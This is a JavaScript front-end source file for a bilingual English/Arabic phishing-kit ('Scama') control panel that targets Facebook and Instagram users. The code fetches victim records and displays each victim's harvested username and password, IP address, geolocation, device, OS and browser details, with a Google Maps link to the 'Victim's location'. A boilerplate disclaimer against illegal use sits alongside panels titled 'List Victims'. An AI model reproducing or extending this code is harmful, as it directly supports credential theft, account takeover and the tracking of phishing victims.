const navBar = document.querySelector(".navbar")
        allLi = document.querySelectorAll("li");

  allLi.forEach((li, index) => {
     li.addEventListener("click" , e =>{
       e.preventDefault(); //preventing from submitting
       navBar.querySelector(".active").classList.remove("active");
       li.classList.add("active");

       const indicator = document.querySelector(".indicator");
       indicator.style.transform = `translateX(calc(${index * 126}px))`;
     });
  });
  //content
  //btns
  const btnHome=  document.getElementById("home")
  const btnVic=  document.getElementById("victim")
  const btnAna=  document.getElementById("analyse")
  const btnSetti=  document.getElementById("settigns")
  // declaration content
  const contentHome = document.querySelector(".content")
  const contentVic = document.querySelector(".content2")
  const contentAnalyse = document.querySelector(".content3")
  const contentSettigns = document.querySelector(".content4")
  // Function to display content
  function displayContent() {
    // Update the content in the displayDiv
    contentVic.style.display= "none";
    contentSettigns.style.display= "none";
  }
  displayContent()
  function home(){
    contentHome.style.display= "block";
    contentVic.style.display= "none";
    contentSettigns.style.display= "none";
  }
  btnHome.addEventListener('click', home);
  function Pvictem(){
    contentVic.style.display= "block";
    contentHome.style.display= "none";
    contentSettigns.style.display= "none";
  }
  btnVic.addEventListener('click', Pvictem);
  function PSettigns(){
    contentSettigns.style.display= "block";
    contentVic.style.display= "none";
    contentHome.style.display= "none";
    
  }
  btnSetti.addEventListener('click', PSettigns);
///fetch number and new user to server
function formatVisitorCount(count) {
  if (count >= 1000000) {
    return `${(count / 1000000).toFixed(1)}M`;
  } else if (count >= 1000) {
    return `${(count / 1000).toFixed(1)}K`;
  } else {
    return count.toString();
  }
}

// Function to fetch and display the formatted visitor count
async function getVisitorCount() {
  const response = await fetch('/getCount');
  const data = await response.json();
  const formattedCount = formatVisitorCount(data.count);
  document.getElementById('visitorCount').innerText = ` ${formattedCount}`;

  // Save the visitor count to localStorage
  localStorage.setItem('visitorCount', data.count);
}

// Load the formatted visitor count when the page loads
document.addEventListener('DOMContentLoaded', getVisitorCount);

//show data frome server to page PVictime 

/// part Settings          
// Change language



const defaultLanguage = 'en';
// lang-en.js


function setLanguage(lang) {
    localStorage.setItem('language', lang);
    updateUI();
    window.location.reload();
}

function getLanguage() {
    return localStorage.getItem('language') || defaultLanguage;
}
let username = null;
let password = null;
let ip = null;
let city = null;
let region = null;
let country = null;
let loc = null;
let org = null;
let postal = null;
let time = null;
let system = null;
let fdevice = null;;
let device = null;
let mfacory = null;
let OS = null;
let ver = null;
let clock = null;
let browser = null;
let linkmaps = null;

function updateUI() {
    const language = getLanguage();
    if(language === 'en'){
        //part en
        const content=  document.getElementById("content")
        const h2Elements = document.getElementsByTagName("h2");
        const content2=  document.getElementById("content2")
        const content4=  document.getElementById("content4")
        const lanar=  document.getElementById("ar")
        const laner=  document.getElementById("en")
        const scam=  document.getElementById("scam")
        const app=  document.getElementById("app")
        const appvic=  document.getElementById("appvic")
        const niti=  document.getElementById("niti")
        const list = document.getElementById("list")
        const btn_try=  document.getElementById("btntry")
        const scmvisi=  document.getElementById("scmvisi")
        const titsettings=  document.getElementById("titsettings")
        const apprence=  document.getElementById("apprence")
        const about=  document.getElementById("about")
        const we=  document.getElementById("we")
        const wer=  document.getElementById("wer")
        const div=  document.getElementById("div")
        
        content.style.direction="ltr";
        content2.style.direction="ltr";
        content4.style.direction="ltr";
        lanar.style.backgroundColor = "#353130"
        laner.style.backgroundColor = "#0aa80a"
        for (var i = 0; i < h2Elements.length; i++) {
          h2Elements[i].style.marginLeft = "50px";
        }
        function TrSCam(){
          if (app.textContent  ===  "Facebook"){
            app.innerText ="Facebook"
          }else if (app.textContent  ==="انستغرام") {
            app.innerText = "Instagram"
          } else {
            app.innerText ="not found"
          }
        }
        TrSCam()
        scam.innerHTML = `<h2 id="scam"  class="hero glitch layers" data-text="Best Scama"><span >Latest Scama</span></h2>`
        btn_try.innerHTML=`<a href="/" id="btn-try" class="try"> Try
        </a>`
        niti.innerText = "Scama will be added soon"
        scmvisi.innerHTML = `<h2 id="scmvisi" class="hero glitch layers" data-text="Scama visitors"><span>Scama visitors</span></h2>`
        list.innerHTML = `<h2 class="hero glitch layers" id="list" data-text="List Victims"><span>List Victims</span></h2>`
        //content 2
        
        //content 4
        titsettings.innerText = "Settings "
        apprence.innerText = "Language"
        about.innerText = "About"
        we.innerText = "WARNING !"  
        wer.innerText= " Use of this site for any illegal activities is in clear violation of applicable laws. We are strongly discouraged from engaging in any theft or fraudulent activities, including account theft, manipulation or fraud. Our goal is to provide a safe and fair environment for all of our users, and we strongly condemn any use of the site that contravenes laws and ethics. All activities and information relating to users are recorded, and we reserve the right to take legal action against anyone who violates this warning and uses the site in illegal ways. Reminder: Please refrain from using the Site if you do not intend to comply with applicable laws and regulations. We encourage the use of this site responsibly and in legal and ethical contexts."
        div.innerText = "Developper :"
        
        //converting fetch data for eche user
        
        username = "Username :";
        password = "Password :";
        ip = "Ip : ";
        city = "City :";
        region = "Region:";
        country = "Country:";
        loc = "Location:";
        org = "Network :";
        postal = "Postal:";
        time = "Time:";
        system = "System :";
        fdevice = "Familly Device";
        device = " Device :";
        mfacory = "Company";
        OS = "OS : ";
        ver = " Version OS :";
        clock = "Date :";
        browser = "Browser :"
        linkmaps = "Victim's location"
        
        
    }else{
      // Change the color for each h2 element {}
      const content=  document.getElementById("content")
      const h2Elements = document.getElementsByTagName("h2");
      const content2=  document.getElementById("content2")
      const content4=  document.getElementById("content4")
      const lanar=  document.getElementById("ar")
      const laner=  document.getElementById("en")
      const scam=  document.getElementById("scam")
      const app=  document.getElementById("app")
      const niti=  document.getElementById("niti")
      const list = document.getElementById("list")
      const btn_try=  document.getElementById("btntry")
      const scmvisi=  document.getElementById("scmvisi")
      const titsettings=  document.getElementById("titsettings")
      const apprence=  document.getElementById("apprence")
      const about=  document.getElementById("about")
      const we=  document.getElementById("we")
      const wer=  document.getElementById("wer")
      const div=  document.getElementById("div")
      
      content.style.direction="rtl";
      content2.style.direction="rtl";
      content4.style.direction="rtl";
      lanar.style.backgroundColor = "#0aa80a"
      laner.style.backgroundColor = "#353130"
      for (var i = 0; i < h2Elements.length; i++) {
        h2Elements[i].style.marginRight = "77px";
      }
      function TrSCam(){
        if (app.textContent  === "Facebook"){
          app.innerText ="فايسبوك"
        }else if (app.textContent  === "Instagram") {
          app.innerText ="انستغرام"
        } else {
          app.innerText ="لم يتم التعرف"
        }
      }
      TrSCam()
      scam.innerHTML = `<h2 id="scam"  class="hero glitch layers" data-text="اخر السكامات  "><span >اخر السكامات</span></h2>`
      btn_try.innerHTML=`<a href="/" id="btn-try" class="try"> جرب
      </a>`
      niti.innerText = "سيتم اضافة السكامات قريبا"
      scmvisi.innerHTML = `<h2 id="scmvisi" class="hero glitch layers" data-text=" زوار سكاما"><span>زوار سكاما</span></h2>`
      list.innerHTML = `<h2 class="hero glitch layers" id="list" data-text="قائمة الضحايا"><span>قائمة الضحايا</span></h2>`
      //content 2
    
      //content 4
      titsettings.innerText = " الاعدادات"
      apprence.innerText = " اللغة"
      about.innerText = "حول"
      we.innerText = "تحذير !"
      wer.innerText = `تحذير: استخدام هذا الموقع لأي أنشطة غير قانونية يعتبر انتهاكًا صريحًا للقوانين السارية. نُحذر بشدة من القيام بأي أنشطة تتعلق بالسرقة أو الاحتيال، بما في ذلك سرقة الحسابات، والتلاعب أو النصب.
      إن هدفنا هو توفير بيئة آمنة ونزيهة لجميع مستخدمينا، ونستنكر بشدة أي استخدام للموقع يتعارض مع القوانين والأخلاقيات. يتم تسجيل جميع الأنشطة والمعلومات المتعلقة بالمستخدمين، ونحتفظ بالحق في اتخاذ الإجراءات القانونية ضد أي شخص يخترق هذا التحذير ويستخدم الموقع بطرق غير قانونية.
      تذكير: يرجى الامتناع عن استخدام الموقع إذا كنت لا تعتزم الالتزام بالقوانين واللوائح السارية. نحن نشجع على استخدام هذا الموقع بشكل مسؤول وفي سياقات قانونية وأخلاقية.`
      div.innerText= "المطور :"
      
      username = "اسم المستخدم :";
      password = "كلمة المرور :";
      ip = "أي بي:";
      city = "المدينة :";
      region = "الجهة :";
      country = "البلد :";
      loc = "الموقع الجغرافي :";
      org = "شبكة الاتصالات :";
      postal = "رقم البريد :";
      time = "الوقت :";
      system = "النظام :";
      fdevice = "عائلة الجهاز :";
      device = "الجهاز :";
      mfacory = "الشركة المصنعة :";
      OS = " نظام الجهاز :";
      ver = " اصدار النظام :";
      clock = "التاريخ :";
      browser = "المتصفح :"
      linkmaps = "موقع الضحية"
      
    }  
    
    // Update the content of HTML elements with the translated text
    
}

// Initialize the UI with the current language
updateUI();

let app = null
fetch('/data')
        .then(response => response.json())
        .then(data => {
            const dataContainer = document.getElementById('tables');
             // مسح المحتوى السابق
            // عرض البيانات في الـ div
            let lang = getLanguage()
            data.victim.forEach(vic => {
              
              if(lang === "en"){
                if(vic.Spam === "Facebook"){
                  app = "Facebook"
                }
              }else{
                if(vic.Spam === "Facebook"){
                  app = "فايسبوك"
                }
              }
              const table2 = document.createElement('div');
              table2.setAttribute('data-name', vic.ip);
              table2.setAttribute('class', 'table');
              table2.innerHTML = "" // تعيين معرف الاسم للعنصر div
              table2.innerHTML = `
              <center><img class="icon" src="assest/icon.png" ><span id="appvic" class="app">${app}</span></center>
              <span class="tag" id="email" >${username}</span><span >${vic.username}</span>
              <br>
              <span id="pass" class="tag">${password}</span><span >${vic.password}</span>
              <br>
              <span id="ip" class="tag">${ip}</span><span >${vic.ip}</span>
              <br>
              <span id="city" class="tag">${city}</span><span >${vic.city}</span>
              <br>
              <span id="region" class="tag">${region}</span><span >${vic.region}</span>
              <br>
              <span id="country" class="tag">${country}</span><span >${vic.country}</span>
              <br>
              <span id="loc" class="tag">${loc}</span><span >${vic.loc}</span>
              <br>
              <span id="org" class="tag">${org}</span><span >${vic.org}</span>
              <br>
              <span  id="postal" class="tag">${postal}</span><span>${vic.postal}</span>
              <br>
              <span id="time" class="tag">${time}</span><span  >${vic.time}</span>
              <br>
              <span class="tag" id="email" >${clock}</span><span >${vic.clock}</span>
              <br>
              <span class="tag" id="email" >${browser}</span><span >${vic.Browser}</span>
              <br>
              <span id="pass" class="tag">${system}</span><span >${vic.SYSTEM}</span>
              <br>
              <span id="ip" class="tag">${fdevice}</span><span >${vic.FDevice}</span>
              <br>
              <span id="city" class="tag">${device}</span><span >${vic.Device}</span>
              <br>
              <span id="region" class="tag">${mfacory}</span><span >${vic.MfactoryD}</span>
              <br>
              <span id="country" class="tag">${OS}</span><span >${vic.OS}</span>
              <br>
              <span id="loc" class="tag">${ver}</span><span >${vic.VersionOS}</span>
              <br>
              <div id= "map">
              <center><a id="linmaps" href="https://www.google.com/maps/@${vic.loc}">${linkmaps}</a></center>
              </div>
              `;
              dataContainer.appendChild(table2);
            });
        })
        .catch(error => {
            console.error('حدث خطأ أثناء تحميل البيانات:', error);
        });
      //code show popup
      
  
